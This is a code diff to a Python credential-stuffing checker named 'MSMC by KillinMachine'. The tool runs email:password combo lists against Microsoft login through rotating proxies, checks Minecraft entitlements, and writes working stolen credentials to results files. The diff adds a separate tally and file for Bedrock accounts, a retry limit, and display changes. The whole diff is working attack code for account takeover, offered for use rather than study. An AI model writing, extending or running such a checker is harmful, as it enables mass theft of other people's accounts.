@@ -22,7 +22,7 @@ sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000004C1
 Combos = []
 proxylist = []
 fname = ""
-hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries = 0,0,0,0,0,0,0,0,0,0,0,0
+hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,bedrock = 0,0,0,0,0,0,0,0,0,0,0,0,0
 urllib3.disable_warnings() #spams warnings because i send unverified requests for debugging purposes
 warnings.filterwarnings("ignore") #spams python warnings on some functions, i may be using some outdated things...
 
@@ -305,13 +305,20 @@ def validmail(email, password):
     if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Valid Mail: {email}:{password}")
 
 def checkmc(session, email, password, token):
-    global retries
+    global retries, bedrock, cpms, checked
     checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
     if checkrq.status_code == 200:
         if 'game_minecraft' in checkrq.text or 'product_minecraft' in checkrq.text:
-            CAPTURE = Capture(email, password, "N/A", "N/A", token)
-            CAPTURE.handle()
-            return True
+            if 'game_minecraft_bedrock' in checkrq.text:
+                bedrock+=1
+                cpm+=1
+                checked+=1
+                with open(f"results/{fname}/Bedrock.txt", 'a') as file: file.write(f"{email}:{password}\n")
+                if screen == "'2'": print(Fore.LIGHTYELLOW_EX+f"Minecraft Bedrock: {email}:{password}")
+            else:
+                CAPTURE = Capture(email, password, "N/A", "N/A", token)
+                CAPTURE.handle()
+                return True
     if checkrq.status_code == 429:
         retries+=1
         session.proxy = getproxy()
@@ -363,8 +370,8 @@ def mclogin(session, email, password, uhs, xsts_token):
         session.proxy = getproxy()
         return mclogin(session, email, password, uhs, xsts_token)
 
-def authenticate(email, password):
-    global retries
+def authenticate(email, password, tries = 0):
+    global retries, bad, checked, cpm
     try:
         session = requests.Session()
         session.verify = False
@@ -391,8 +398,16 @@ def authenticate(email, password):
         #traceback.print_exc()
         #line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
         #print("Exception occurred at line:", line_number)
-        retries+=1
-        authenticate(email, password)
+        if tries < maxretries:
+            tries+=1
+            retries+=1
+            authenticate(email, password, tries)
+        else:
+            bad+=1
+            checked+=1
+            cpm+=1
+            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
+
 
 def Load():
     global Combos, fname
@@ -441,7 +456,7 @@ def logscreen():
     global cpm, cpm1
     cmp1 = cpm
     cpm = 0
-    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
+    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Bedrock: {bedrock}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
     time.sleep(1)
     threading.Thread(target=logscreen, args=()).start()    
 
@@ -460,7 +475,7 @@ def cuiscreen():
     print(f" [{vm}] Valid Mail")
     print(f" [{retries}] Retries")
     print(f" [{errors}] Errors")
-    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
+    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Bedrock: {bedrock}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
     time.sleep(1)
     threading.Thread(target=cuiscreen, args=()).start()
 
@@ -475,6 +490,7 @@ def finishedscreen():
     print("SFA: "+str(sfa))
     print("MFA: "+str(mfa))
     print("2FA: "+str(twofa))
+    print("Bedrock: "+str(bedrock))
     print("Valid Mail: "+str(vm))
     print(Fore.LIGHTRED_EX+"Press any key to exit.")
     repr(readchar.readkey())
